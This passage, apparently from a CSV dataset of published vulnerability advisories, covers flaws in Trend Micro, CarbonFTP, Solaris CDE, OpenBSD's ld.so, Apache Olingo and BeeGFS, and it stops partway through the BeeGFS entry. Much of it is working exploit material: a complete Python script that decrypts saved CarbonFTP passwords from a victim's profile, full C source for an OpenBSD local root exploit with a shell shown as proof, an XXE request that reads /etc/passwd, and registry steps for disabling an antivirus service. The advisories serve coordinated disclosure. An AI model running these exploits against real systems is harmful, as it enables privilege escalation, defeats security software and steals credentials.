""Program testing can be used to show the presence of bugs, but never to show their absence!"" Edsger W. Dijkstra
@Mediaservice.net S.r.l.        
Tel: +39-011-32.72.100  (centralino)
Fax: +39-011-32.46.497
Via Santorelli, 15 - 10095 Grugliasco (TO) - ITALY 
https://www.mediaservice.net/disclaimer
-------------------------------------------------------------------------"
70,Trend Micro Security (Consumer) Multiple Products Persistent Arbitrary Code Execution CVE-2019-20357,,CVE-2019-20357,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/TREND-MICRO-SECURITY-CONSUMER-PERSISTENT-ARBITRARY-CODE-EXECUTION.txt
[+] twitter.com/hyp3rlinx
[+] ISR: ApparitionSec
[Vendor]
www.trendmicro.com
[Product(s)]
Trend Micro Security (Consumer) Multiple Products
Trend Micro Security provides comprehensive protection for your devices.
This includes protection against ransomware, viruses, malware, spyware, and identity theft.
[Vulnerability Type]
Persistent Arbitrary Code Execution
[CVE Reference]
CVE-2019-20357
[CVSSv3 Scores: 6.7]
[Security Issue]
Trend Micro Security can potentially allow an attackers to use a malicious program to escalate privileges
to SYSTEM integrity and attain persistence on a vulnerable system.
[Product Affected Versions]
Platform Microsoft Windows
Premium Security 2019 (v15) and 2020 (v16)
Maximum Security
2019 (v15) and 2020 (v16)
Internet Security
2019 (v15) and 2020 (v16)

Antivirus + Security
2019 (v15) and 2020 (v16)
[References]
https://esupport.trendmicro.com/en-us/home/pages/technical-support/1124099.aspx
[Exploit/POC]
Compile C test code ""Program.c""
void main(void){
puts(""Done!"");
system(""pause"");
}
1) Place under c: dir.
2) Reboot the machine, the coreServiceShell.exe service loads and executes our binary with SYSTEM integrity.
[Network Access]
Local
[Severity]
Medium
[Disclosure Timeline]
Vendor Notification: October 8, 2019
vendor advisory: January 15, 2020
January 16, 2020 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
71,Trend Micro Security 2019 (Consumer) Multiple Products Security Bypass Protected Service Tampering CVE-2019-19697,,CVE-2019-19697,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/TREND-MICRO-SECURITY-CONSUMER-SECURITY-BYPASS-PROTECTED-SERVICE-TAMPERING.txt
[+] ISR: ApparitionSec
[Vendor]
www.trendmicro.com
[Product]
Trend Micro Security 2019 (Consumer) Multiple Products
Trend Micro Security provides comprehensive protection for your devices.
This includes protection against ransomware, viruses, malware, spyware, and identity theft.
[Vulnerability Type]
Security Bypass Protected Service Tampering
[CVE Reference]
CVE-2019-19697
[Security Issue]
Trend Micro Maximum Security is vulnerable to arbitrary code execution as it allows for creation of registry key to target a process running as SYSTEM.
This can allow a malware to gain elevated privileges to take over and shutdown services that require SYSTEM privileges like Trend Micros ""Asmp""
service ""coreServiceShell.exe"" which does not allow Administrators to tamper with them.
This could allow an attacker or malware to gain elevated privileges and tamper with protected services by disabling or otherwise preventing them to start.
Note administrator privileges are required to exploit this vulnerability.
[CVSS 3.0 Scores: 3.9]
[Affected versions]
Platform Microsoft Windows
Premium Security 2019 (v15)
Maximum Security 2019 (v15)
Internet Security 2019 (v15)
Antivirus + Security 2019 (v15)
[References]
https://esupport.trendmicro.com/en-us/home/pages/technical-support/1124090.aspx
[Exploit/POC]
1) Create a entry for the following registry key targeting ""PtWatchdog.exe"" and set the debugger string value to an arbitrary executable to gain SYSTEM privs.
HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution OptionsPtWatchdog.exe
2) Create a string named ""debugger"" under the reg key and give it the value of the executable you wish to run as SYSTEM.
3) Restart the machine or wait until service is restart then you get SYSTEM and can now disable Trend Micro endpoint security coreServiceShell.exe service
[Network Access]
Local
[Severity]
Low
[Disclosure Timeline]
Vendor Notification: October 8, 2019
Vendor confirms issue: October 28, 2019
Vendor release date: January 14, 2020
January 16, 2020 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
72,Neowise CarbonFTP v1.4 Insecure Proprietary Password Encryption CVE-2020-6857,,CVE-2020-6857,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/NEOWISE-CARBONFTP-v1.4-INSECURE-PROPRIETARY-PASSWORD-ENCRYPTION.txt
[+] twitter.com/hyp3rlinx
[+] ISR: ApparitionSec
[Vendor]
www.neowise.com
[Product]
CarbonFTP v1.4
CarbonFTP is a file synchronization tool that enables you to synch local files with a remote FTP server and vice versa.
It provides a step-by-step wizard to select the folders to be synchronized, the direction of the synchronization and option
to set file masks to limit the transfer to specific file types. Your settings can be saved as projects, so they can be
quickly re-used later.
Download: https://www.neowise.com/freeware/
Hash: 7afb242f13a9c119a17fe66c6f00a1c8
[Vulnerability Type]
Insecure Proprietary Password Encryption
[CVE Reference]
CVE-2020-6857
[Affected Component]
Password Encryption
[Impact Escalation of Privileges]
true
[Impact Information Disclosure]
true
[Security Issue]
CarbonFTP v1.4 uses insecure proprietary password encryption with a hard-coded weak encryption key.
The key for locally stored FTP server passwords is hard-coded in the binary. Passwords encoded as hex
are coverted to decimal which is then computed by adding the key ""97F"" to the result. The key 97F seems
to be the same for all executables across all systems. Finally, passwords are stored as decimal values.
If a user chooses to save the project the passwords are stored in "".CFTP"" local configuration files.
They can be found under ""C:Users<VICTIM>AppDataRoamingNeowiseCarbonFTPProjects"".
e.g.
Password=STRING|""2086721956209392195620939""
Observing some very short password examples we see interesting patterns:
27264 27360 27360 27360 27360 = a
27520 27617 27617 27617 27617 = b
27266 27616 27360 27361 27616 = aab
27521 27616 27616 27616 27616 = ba
Password encryption/decryption is as follows.
Encryption process example.
484C as decimal is the value 18508
97F hex to decimal is the value 2431 (encrypt key)
18508 + 2431 = 20939, the value 20939 would then represent the ascii characters ""HL"".
To decrypt we just perform the reverse of the operation above.
20939 - 2431 = 18508
Next, convert the decimal value 18508 to hex and we get 484C.
Finally, convert the hex value 484C to ascii to retrieve the plaintext password of ""HL"".
CarbonFTP passwords less than nine characters are padded using chars from the current password up until
reaching a password length of nine bytes.
The two char password ""XY"" in encrypted form ""2496125048250482504825048"" is padded with ""XY"" until reaching a length
of nine bytes ""XYXYXYXYX"".
Similarly, the password ""HELL"" is ""2086721956209392195620939"" and again is padded since its length is less than nine bytes.
Therefore, we will get several cracked password candidates like: ""HELLHELL | HELLHEL | HELLH | HELL | HEL | HE | HELLHELLH""
However, the longer the password the easier it becomes to crack them, as we can decrypt passwords in one
shot without having several candidates to choose from with one of them being the correct password.
Therefore, ""LOOOOONGPASSWORD!"" is stored as the encrypted string ""219042273422734224782298223744247862350210947""
and because it is greater than nine bytes it is cracked without any candidate passwords returned.
From offset 0047DA6F to 0047DAA0 is the loop that performs the password decryption process.
Using the same password ""HELL"" as example.
BPX @47DA6F
0047DA6F | 8D 45 F0 | lea eax,dword ptr ss:[ebp-10] |
0047DA72 | 50 | push eax |
0047DA73 | B9 05 00 00 00 | mov ecx,5 |
0047DA78 | 8B D3 | mov edx,ebx |
0047DA7A | 8B 45 FC | mov eax,dword ptr ss:[ebp-4] | [ebp-4]:""2086721956209392195620939""
0047DA7D | E8 F6 6B F8 FF | call carbonftp.404678 |
0047DA82 | 83 C3 05 | add ebx,5 |
0047DA85 | 8B 45 F0 | mov eax,dword ptr ss:[ebp-10] | [ebp-10]:""20867""
0047DA88 | E8 AF AD F8 FF | call carbonftp.40883C |
0047DA8D | 2B 45 F8 | sub eax,dword ptr ss:[ebp-8] | ;<======= BOOOM ENCRYPT/DECRYPT KEY 97F IN DECIMAL ITS 2431
0047DA90 | 66 89 06 | mov word ptr ds:[esi],ax |
0047DA93 | 83 C6 02 | add esi,2 |
0047DA96 | 8B 45 FC | mov eax,dword ptr ss:[ebp-4] | [ebp-4]:""2086721956209392195620939""
0047DA99 | E8 7A 69 F8 FF | call carbonftp.404418 |
0047DA9E | 3B D8 | cmp ebx,eax |
0047DAA0 | 7E CD | jle carbonftp.47DA6F |
Ok, simple explanation after SetBPX in 47DA88...
At offset 0047DA8D, 97F is subtracted at [ebp-8] local variable which equals the decimal value 2431 (hex 97F)
we also see EAX holds the value 55C4
sub eax,dword ptr ss:[ebp-8]
therefore, 55C4 – 97F = 4C45 <======= ENCRYPT/DECRYPT KEY PROCESS.
mov word ptr ds:[esi],ax
add esi, 2 which is 4C45 + 2 = 4C47 <===== THEN
Given a two letter combination like ""HL"":
484C as decimal is 18508
97F hex to decimal is 2431
18508 + 2431 = 20939 = ""HL""
Done!
[Exploit/POC]
""CarbonFTPExploit.py""
import time, string, sys, argparse, os
from pkgutil import iter_modules
#Sample test password
#LOOOOONGPASSWORD! = 219042273422734224782298223744247862350210947
key=""97F"" #2431 in decimal, the weak hardcoded encryption key within the vuln program.
chunk_sz=5 #number of bytes we must decrypt the password by.
#Password is stored here:
#C:Users<VICTIM>AppDataRoamingNeowiseCarbonFTPProjects<FILE>.CFTP
#Neowise CarbonFTP v1.4
#Insecure Proprietary Password Encryption
#By John Page (aka hyp3rlinx)
#Apparition Security
#===================================================
def haslib(lib):
if not lib in (name for loader, name, ispkg in iter_modules()):
print(""[!] ""+lib+ "" does not exist, pip install ""+lib)
exit()
return True
def carbonftp_conf(conf_file):
p=""""
pipe=-1
passwd=""""
lst_of_passwds=[]
try:
for p in conf_file:
idx = p.find(""Password=STRING|"")
if idx != -1:
pipe = p.find(""|"")
if pipe != -1:
passwd = p[pipe + 2: -2]
print("" Password found: ""+ passwd)
lst_of_passwds.append(passwd)
except Exception as e:
print(str(e))
return lst_of_passwds
def reorder(lst):
k=1
j=0
for n in range(len(lst)):
k+=1
j+=1
try:
tmp = lst[n+k]
a = lst[n+j]
lst[n+j] = tmp
lst[n+k] = a
except Exception as e:
pass
return ''.join(lst)
def dec2hex(dec):
tmp = str(hex(int(dec)))
return str(tmp[2:])
def hex2ascii(h):
h=h.strip()
try:
hex_val = h.decode(""hex"")
except Exception as e:
print(""[!] Not a valid hex string."")
exit()
filtered_str = filter(lambda s: s in string.printable, hex_val)
return filtered_str
def chunk_passwd(passwd_lst):
lst = []
for passwd in passwd_lst:
while passwd:
lst.append(passwd[:chunk_sz])
passwd = passwd[chunk_sz:]
return lst
cnt = 0
passwd_str=""""
def deob(c):
global cnt, passwd_str
tmp=""""
try:
tmp = int(c) - int(key, 16)
tmp = dec2hex(tmp)
except Exception as e:
print(""[!] Not a valid CarbonFTP encrypted password."")
exit()
b=""""
a=""""
#Seems we can delete the second char as its most always junk.
if cnt!=1:
a = tmp[:2]
cnt+=1
else:
b = tmp[:4]
passwd_str += hex2ascii(a + b)
hex_passwd_lst = list(passwd_str)
return hex_passwd_lst
def no_unique_chars(lst):
c=0
k=1
j=0
for i in range(len(lst)):
k+=1
j+=1
try:
a = lst[i]
b = lst[i+1]
if a != b:
c+=1
elif c==0:
print(""[!] Possible one char password?: "" +str(lst[0]))
return lst[0]
except Exception as e:
pass
return False
def decryptor(result_lst):
global passwd_str, sz
final_carbon_passwd=""""
print("" Decrypting ... "")
for i in result_lst:
print(""[-] ""+i)
time.sleep(0.1)
lst = deob(i)
#Re-order chars to correct sequence using custom swap function (reorder).
reordered_pass = reorder(lst)
sz = len(reordered_pass)
#Flag possible single char password.
no_unique_chars(lst)
print(""[+] PASSWORD LENGTH: "" + str(sz))
if sz == 9:
return (reordered_pass[:-1] + "" | "" + reordered_pass[:-2] + "" | "" + reordered_pass[:-4] + "" | "" +
reordered_pass[:-5] +"" | "" + reordered_pass[:-6] + "" | ""+ reordered_pass[:-7] + "" | "" + reordered_pass)
#Shorter passwords less then nine chars will have several candidates
#as they get padded with repeating chars so we return those.
passwd_str=""""
return reordered_pass
def display_cracked_passwd(sz, passwd):
if sz==9:
print(""[*] PASSWORD CANDIDATES: ""+ passwd + "" "")
else:
print(""[*] DECRYPTED PASSWORD: ""+passwd + "" "")
def parse_args():
parser = argparse.ArgumentParser()
parser.add_argument(""-u"", ""--user"", help=""Username to crack a directory of Carbon .CFTP password files"")
parser.add_argument(""-p"", ""--encrypted_password"", help=""Crack a single encrypted password"")
return parser.parse_args()
def main(args):
global passwd_str, sz
victim=""""
haslib(""clint"")
if args.user and args.encrypted_password:
print(""[!] Supply a victims username -u or single encrypted password -p, not both."")
exit()
print(""[+] Neowise CarbonFTP v1.4"")
time.sleep(0.1)
print(""[+] CVE-2020-6857 Insecure Proprietary Password Encryption"")
time.sleep(0.1)
print(""[+] Discovered and cracked by hyp3rlinx"")
time.sleep(0.1)
print(""[+] ApparitionSec "")
time.sleep(1)
#Crack a dir of carbonFTP conf files containing encrypted passwords -u flag.
if args.user:
victim = args.user
os.chdir(""C:/Users/""+victim+""/AppData/Roaming/Neowise/CarbonFTPProjects/"")
dir_lst = os.listdir(""."")
for c in dir_lst:
f=open(""C:/Users/""+victim+""/AppData/Roaming/Neowise/CarbonFTPProjects/""+c, ""r"")
#Get encrypted password from conf file
passwd_enc = carbonftp_conf(f)
#Break up into 5 byte chunks as processed by the proprietary decryption routine.
result_lst = chunk_passwd(passwd_enc)
#Decrypt the 5 byte chunks and reassemble to the cleartext password.
cracked_passwd = decryptor(result_lst)
#Print cracked password or candidates.
display_cracked_passwd(sz, cracked_passwd)
time.sleep(0.3)
passwd_str=""""
f.close()
#Crack a single password -p flag.
if args.encrypted_password:
passwd_to_crack_lst = []
passwd_to_crack_lst.append(args.encrypted_password)
result = chunk_passwd(passwd_to_crack_lst)
#Print cracked password or candidates.
cracked_passwd = decryptor(result)
display_cracked_passwd(sz, cracked_passwd)
if __name__==""__main__"":
parser = argparse.ArgumentParser()
if len(sys.argv)==1:
parser.print_help(sys.stderr)
exit()
main(parse_args())
[POC Video URL]
https://www.youtube.com/watch?v=q9LMvAl6LfE
[Network Access]
Local
[Severity]
High
[Disclosure Timeline]
Vendor Notification: Website contact form not working, several attempts : January 12, 2020
CVE Assigned by mitre : January 13, 2020
January 20, 2020 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
77,CVE-2020-2696 - Local privilege escalation via CDE dtsession,,CVE-2020-2696,"Dear Bugtraq,
Please find attached an advisory for the following vulnerability, fixed in Oracle's Critical Patch Update (CPU) of January 2020:
""A buffer overflow in the CheckMonitor() function in the Common Desktop Environment 2.3.1 and earlier and 1.6 and earlier, as distributed with Oracle Solaris 10 1/13 (Update 11) and earlier, allows local users to gain root privileges via a long palette name passed to dtsession in a malicious .Xdefaults file.""
For further information, please refer to:
https://techblog.mediaservice.net/2020/01/local-privilege-escalation-via-cde-dtsession/
https://github.com/0xdea/exploits/blob/master/solaris/raptor_dtsession_ipa.c
Regards,
--
Marco Ivaldi, Offensive Security Manager
CISSP, OSCP, QSA, ASV, OPSA, OPST, OWSE, LA27001, PRINCE2F
@Mediaservice.net S.r.l. con Socio Unico
https://www.mediaservice.net/
Tel: +39 011 19016595 | Fax: +39 011 3246497"
78,CVE-2020-2656 - Low impact information disclosure via Solaris xlock,,CVE-2020-2656,"Dear Bugtraq,
Please find attached an advisory for the following vulnerability, fixed in Oracle's Critical Patch Update (CPU) of January 2020:
""A low impact information disclosure vulnerability in the setuid root xlock binary distributed with Solaris may allow local users to read partial contents
of sensitive files. Due to the fact that target files must be in a very specific format, exploitation of this flaw to escalate privileges in a realistic scenario is unlikely.""
Regards,
--
Marco Ivaldi, Offensive Security Manager
CISSP, OSCP, QSA, ASV, OPSA, OPST, OWSE, LA27001, PRINCE2F
@Mediaservice.net S.r.l. con Socio Unico
https://www.mediaservice.net/"
123,Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726),,CVE-2019-19726,"Qualys Security Advisory
Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)
==============================================================================
Contents
==============================================================================
Summary
Analysis
Demonstration
Acknowledgments
==============================================================================
Summary
==============================================================================
We discovered a Local Privilege Escalation in OpenBSD's dynamic loader
(ld.so): this vulnerability is exploitable in the default installation
(via the set-user-ID executable chpass or passwd) and yields full root
privileges.
We developed a simple proof of concept and successfully tested it
against OpenBSD 6.6 (the current release), 6.5, 6.2, and 6.1, on both
amd64 and i386; other releases and architectures are probably also
exploitable.
==============================================================================
Analysis
==============================================================================
In this section, we analyze a step-by-step execution of our proof of
concept:
------------------------------------------------------------------------------
1/ We execve() the set-user-ID /usr/bin/chpass, but first:
1a/ we set the LD_LIBRARY_PATH environment variable to one single dot
(the current working directory) and approximately ARG_MAX colons (the
maximum number of bytes for the argument and environment list); as
described in man ld.so:
LD_LIBRARY_PATH
A colon separated list of directories, prepending the default
search path for shared libraries. This variable is ignored for
set-user-ID and set-group-ID executables.
1b/ we set the RLIMIT_DATA resource limit to ARG_MAX * sizeof(char *)
(2MB on amd64, 1MB on i386); as described in man setrlimit:
RLIMIT_DATA The maximum size (in bytes) of the data segment for a
process; this includes memory allocated via malloc(3) and
all other anonymous memory mapped via mmap(2).
------------------------------------------------------------------------------
2/ Before the main() function of chpass is executed, the _dl_boot()
function of ld.so is executed and calls _dl_setup_env():
262 void
263 _dl_setup_env(const char *argv0, char **envp)
264 {
...
271 _dl_libpath = _dl_split_path(_dl_getenv(""LD_LIBRARY_PATH"", envp));
...
283 _dl_trust = !_dl_issetugid();
284 if (!_dl_trust) { /* Zap paths if s[ug]id... */
285 if (_dl_libpath) {
286 _dl_free_path(_dl_libpath);
287 _dl_libpath = NULL;
288 _dl_unsetenv(""LD_LIBRARY_PATH"", envp);
289 }
------------------------------------------------------------------------------
3/ At line 271, _dl_getenv() returns a pointer to our LD_LIBRARY_PATH
environment variable and passes it to _dl_split_path():
23 char **
24 _dl_split_path(const char *searchpath)
25 {
..
35 pp = searchpath;
36 while (*pp) {
37 if (*pp == ':' || *pp == ';')
38 count++;
39 pp++;
40 }
..
45 retval = _dl_reallocarray(NULL, count, sizeof(*retval));
46 if (retval == NULL)
47 return (NULL);
------------------------------------------------------------------------------
4/ At line 45, count is approximately ARG_MAX (the number of colons in
our LD_LIBRARY_PATH) and _dl_reallocarray() returns NULL (because of our
low RLIMIT_DATA); at line 47, _dl_split_path() returns NULL.
------------------------------------------------------------------------------
5/ As a result, _dl_libpath is NULL (line 271) and our LD_LIBRARY_PATH
is ignored, but it is not deleted from the environment (CVE-2019-19726):
although _dl_trust is false (_dl_issetugid() returns true because chpass
is set-user-ID), _dl_unsetenv() is not called (line 288) because
_dl_libpath is NULL (line 285).
------------------------------------------------------------------------------
6/ Next, the main() function of chpass is executed, and it:
6a/ calls setuid(0), which sets the real and effective user IDs to 0;
6b/ calls pw_init(), which resets RLIMIT_DATA to RLIM_INFINITY;
6c/ calls pw_mkdb(), which vfork()s and execv()s /usr/sbin/pwd_mkdb
(unlike execve(), execv() does not reset the environment).
------------------------------------------------------------------------------
7/ Before the main() function of pwd_mkdb is executed, the _dl_boot()
function of ld.so is executed and calls _dl_setup_env():
7a/ at line 271, _dl_getenv() returns a pointer to our
LD_LIBRARY_PATH environment variable (because it was not deleted from
the environment in step 5, and because execv() did not reset the
environment in step 6c);
7b/ at line 45, _dl_reallocarray() does not return NULL anymore
(because our low RLIMIT_DATA was reset in step 6b);
7c/ as a result, _dl_libpath is not NULL (line 271), and it is not
reset to NULL (line 287) because _dl_trust is true (_dl_issetugid()
returns false because pwd_mkdb is not set-user-ID, and because the
real and effective user IDs were both set to 0 in step 6a): our
LD_LIBRARY_PATH is not ignored anymore.
------------------------------------------------------------------------------
8/ Finally, ld.so searches for shared libraries in _dl_libpath (our
LD_LIBRARY_PATH) and loads our own library from the current working
directory (the dot in our LD_LIBRARY_PATH).
------------------------------------------------------------------------------
==============================================================================
Demonstration
==============================================================================
In this section, we demonstrate the use of our proof of concept:
------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)
$ cd /tmp
$ cat > lib.c << ""EOF""
#include <paths.h>
#include <unistd.h>
static void __attribute__ ((constructor)) _init (void) {
if (setuid(0) != 0) _exit(__LINE__);
if (setgid(0) != 0) _exit(__LINE__);
char * const argv[] = { _PATH_KSHELL, ""-c"", _PATH_KSHELL ""; exit 1"", NULL };
execve(argv[0], argv, NULL);
_exit(__LINE__);
}
EOF
$ readelf -a /usr/sbin/pwd_mkdb | grep NEEDED
0x0000000000000001 (NEEDED) Shared library: [libutil.so.13.1]
0x0000000000000001 (NEEDED) Shared library: [libc.so.95.1]
$ gcc -fpic -shared -s -o libutil.so.13.1 lib.c
$ cat > poc.c << ""EOF""
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <unistd.h>
int
main(int argc, char * const * argv)
{
#define LLP ""LD_LIBRARY_PATH=.""
static char llp[ARG_MAX - 128];
memset(llp, ':', sizeof(llp)-1);
memcpy(llp, LLP, sizeof(LLP)-1);
char * const envp[] = { llp, ""EDITOR=echo '#' >>"", NULL };
#define DATA (ARG_MAX * sizeof(char *))
const struct rlimit data = { DATA, DATA };
if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);
if (argc <= 1) _exit(__LINE__);
argv += 1;
execve(argv[0], argv, envp);
_exit(__LINE__);
}
EOF
$ gcc -s -o poc poc.c
$ ./poc /usr/bin/chpass
# id
uid=0(root) gid=0(wheel) groups=32767(nobody)
------------------------------------------------------------------------------
==============================================================================
Acknowledgments
==============================================================================
We thank Theo de Raadt and the OpenBSD developers for their incredibly
quick response: they published a patch for this vulnerability in less
than 3 hours. We also thank MITRE's CVE Assignment Team.
[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us."
132,CVE-2019-17554 - Apache Olingo OData 4.0 - XML External Entity Resolution (XXE),,CVE-2019-17554,"#############################################################
#
# COMPASS SECURITY ADVISORY
# https://www.compass-security.com/research/advisories/
#
#############################################################
#
# Product: Apache Olingo OData 4.0
# Vendor: Apache Foundation
# CSNC ID: CSNC-2009-025
# CVE ID: CVE-2019-17554
# Subject: XML External Entity Resolution (XXE)
# Risk: High
# Effect: Remotely exploitable
# Author: Archibald Haddock (advisories compass-security com)
# Date: 08.11.2019
#
#############################################################
Introduction:
-------------
Apache Olingo is a Java library that implements the Open Data Protocol (OData). [1]
XML data is parsed by insecurley configured software components, which can be abused for XML External Entity Attacks [2].
Affected:
---------
Vulnerable:
* Olingo OData 4.x.x to 4.6.x
Not vulnerable:
* Olingo OData 4.7.0
* The Olingo OData 2.0 implementation has XXE protection since 1.1.0-RC01
Technical Description
---------------------
The XML content type entity deserializer is not configured to deny the resolution of external entities.
Request with content type ""application/xml"", which trigger the deserialization of entities, can be used to trigger XXE attacks.
Request
======
POST /odata-server-sample/cars.svc/Cars HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost:8081/odata-server-sample/
Cookie: JSESSIONID=17C3158153CDC2CA1DBA0E77D4AFC3B0
Upgrade-Insecure-Requests: 1
content-type: application/xml
Content-Length: 1101
<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
<a:entry xmlns:a=""http://www.w3.org/2005/Atom"" xmlns:m=""http://docs.oasis-open.org/odata/ns/metadata"" xmlns:d=""http://docs.oasis-open.org/odata/ns/data"" m:context=""$metadata#Cars/$entity"">
<a:id>Cars(1)</a:id>
<a:title></a:title>
<a:summary></a:summary>
<a:updated>2019-11-08T15:10:30Z</a:updated>
<a:author>
<a:name></a:name>
</a:author>
<a:link rel=""edit"" href=""Cars(1)""></a:link>
<a:link rel=""http://docs.oasis-open.org/odata/ns/related/Manufacturer"" type=""application/atom+xml;type=feed"" title=""Manufacturer"" href=""Cars(1)/Manufacturer""></a:link>
<a:category scheme=""http://docs.oasis-open.org/odata/ns/scheme"" term=""#olingo.odata.sample.Car""></a:category>
<a:content type=""application/xml"">
<m:properties>
<d:Id m:type=""Int16"">1</d:Id>
<d:Model>F1 &xxe;</d:Model>
<d:ModelYear>2012</d:ModelYear>
<d:Price m:type=""Decimal"">189189.43</d:Price>
<d:Currency>EUR</d:Currency>
</m:properties>
</a:content>
</a:entry>
Response
========
HTTP/1.1 201 Created
Server: Apache-Coyote/1.1
OData-Version: 4.0
Content-Type: application/xml
Content-Length: 960
Date: Fri, 08 Nov 2019 14:22:35 GMT
Connection: close
<?xml version=""1.0"" encoding=""UTF-8""?><a:entry xmlns:a=""http://www.w3.org/2005/Atom"" xmlns:m=""http://docs.oasis-open.org/odata/ns/metadata"" xmlns:d=""http://docs.oasis-open.org/odata/ns/data"" m:context=""$metadata#Cars""><a:id>Cars(1)</a:id><a:title></a:title><a:summary></a:summary><a:updated>2019-11-08T15:22:35Z</a:updated><a:author><a:name></a:name></a:author><a:link rel=""edit"" href=""Cars(1)""></a:link><a:link rel=""http://docs.oasis-open.org/odata/ns/related/Manufacturer"" type=""application/atom+xml;type=feed"" title=""Manufacturer"" href=""Cars(1)/Manufacturer""></a:link><a:category scheme=""http://docs.oasis-open.org/odata/ns/scheme"" term=""#olingo.odata.sample.Car""></a:category><a:content type=""application/xml""><m:properties><d:Id m:type=""Int16"">1</d:Id><d:Model>
myuser:x:1000:1000:,,,:/home/myuser:/bin/bash
</d:Model><d:ModelYear>2012</d:ModelYear><d:Price m:type=""Decimal"">189189.43</d:Price><d:Currency>EUR</d:Currency></m:properties></a:content></a:entry>
Workaround / Fix:
-----------------
Configure the XML reader securely [3].
In org.apache.olingo.server.core.deserializer.xml.ODataXmlDeserializer.java on line 70 a javax.xml.stream.XMLInputFactory is instanciated:
private static final XMLInputFactory FACTORY = XMLInputFactory.newFactory();
The XMLInputFactory should be configured, not to resolve external entities:
FACTORY.setProperty(XMLInputFactory.SUPPORT_DTD, false);
FACTORY.setProperty(""javax.xml.stream.isSupportingExternalEntities"", false);
Timeline:
---------
2019-11-08: Discovery by Compass Security
2019-11-08: Initial vendor notification
2019-11-08: Initial vendor response
2019-12-04: Release of fixed Version / Patch [4]
2019-12-05: Coordinated public disclosure date
[1] https://olingo.apache.org/
[2] https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
[3] https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
[4] https://mail-archives.apache.org/mod_mbox/olingo-user/201912.mbox/%3CCAGSZ4d7Ty%3DL-n_iAzT6vcQp65BY29XZDS5tMoM8MdDrb1moM7A%40mail.gmail.com%3E
Source: https://www.compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2019-025_apache_xxe.txt"
136,BeeGFS Privilege Escalation (CVE-2019-15897),,CVE-2019-15897,"============================================
BeeGFS Privilege Escalation (CVE-2019-15897)
============================================
* Software: BeeGFS
* Affected Versions: All versions upto and including 7.1.3
* Vendor: ThinkparQ
* CVE: CVE-2019-15897
* Severity: CVSS 9.6 (Critical) [CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H]
* Author: John Fitzpatrick
* Date: 2019-12-04
Description
===========
BeeGFS is a ""leading parallel cluster filesystem"", used in many HPC environments. A vulnerability exists in a default installation of BeeGFS which allows users to perform operations which allow them to elevate their privileges and become root. This is due to a failure to properly authenticate a user when performing filesystem operations. BeeGFS deployments utilising the BeeGFS cloudformation template were also affected by this issue.
Installations which are making use of connection-based authentication, using the �connAuthFile� option to specify a shared key, are not affected by this issue if the shared key is only readable by root. Without a connAuthFile configured any host able to communicate with the BeeGFS cluster can become part of the cluster and mount the BeeGFS filesystem.
In order to resolve this issue BeeGFS users should configure connection-based authentication within their environment ensuring that the shared key is only readable by root. This will prevent non root users from exploiting this issue but will prevent non-root users from utilising utilities such as beegfs-ctl.
Solution / Workaround
=====================
This vulnerability can be mitigated by making use of the connAuthFile configuration option. This option, whilst intended to restrict which hosts can communicate with BeeGFS, can also be leveraged to prevent non root users from gaining root as a result of this weakness. This is done by setting the path to a shared key within the BeeGFS configuration file on each node. An example of this is shown below:
